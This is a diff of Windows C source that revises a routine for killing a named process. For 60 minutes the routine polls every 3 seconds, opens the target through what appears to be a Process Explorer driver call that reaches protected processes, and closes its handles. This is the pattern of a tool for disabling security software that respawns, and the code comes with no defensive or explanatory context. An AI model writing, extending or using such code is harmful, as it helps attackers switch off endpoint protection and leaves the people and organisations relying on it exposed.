@@ -105,48 +105,31 @@ int PrintInputError(DWORD dwErrorValue) {
 }
 
 
-// Helper function to kill the process if it exists for 60 minutes
+// Add a helper function to kill the process if it exists
 void MonitorAndKillProcess(LPWSTR szProcessName) {
 	DWORD dwPid = 0;
-	BOOL isProcessRunning = FALSE;
-
+ 
 	// Run for 60 minutes to remove respawning processes
 	for (int i = 0; i < 1200; i++) {
 		// Look up the PID of the process by its name
 		if (GetProcessPIDFromName(szProcessName, &dwPid)) {
-			// Check if the process is running by attempting to open it
-			HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPid);
-			if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE) {
-				isProcessRunning = TRUE;
-				CloseHandle(hProcess);  // Close the handle if the process is running
-			}
-			else {
-				isProcessRunning = FALSE;  // Process is not running
-			}
-
-			if (isProcessRunning) {
-				printf("[*] Process %ws with PID %d is running. Attempting to kill...\n", szProcessName, dwPid);
-				// Perform the kill operation on the process
-				HANDLE hProtectedProcess = ProcExpOpenProtectedProcess(dwPid);
-				if (hProtectedProcess != INVALID_HANDLE_VALUE) {
-					KillProcessHandles(hProtectedProcess);  // Kill the process
-					Success("Killing process succeeded\n");
-					CloseHandle(hProtectedProcess);
-				}
-			}
-			else {
-				printf("[*] Process %ws not found. Waiting for next check...\n", szProcessName);
+			printf("[*] Process %ws with PID %d is running. Attempting to kill...\n", szProcessName, dwPid);
+			// Perform the kill operation on the process
+			HANDLE hProtectedProcess = ProcExpOpenProtectedProcess(dwPid);
+			if (hProtectedProcess != INVALID_HANDLE_VALUE) {
+				KillProcessHandles(hProtectedProcess);  // Kill the process
+				Success("Killing process succeeded\n");
+				CloseHandle(hProtectedProcess);
 			}
 		}
 		else {
 			printf("[*] Process %ws not found. Waiting for next check...\n", szProcessName);
+ 
 		}
-
 		// Wait for 3 seconds before checking again
 		Sleep(3000);
 	}
 }
-
 
 int main(int argc, char* argv[]) {
 
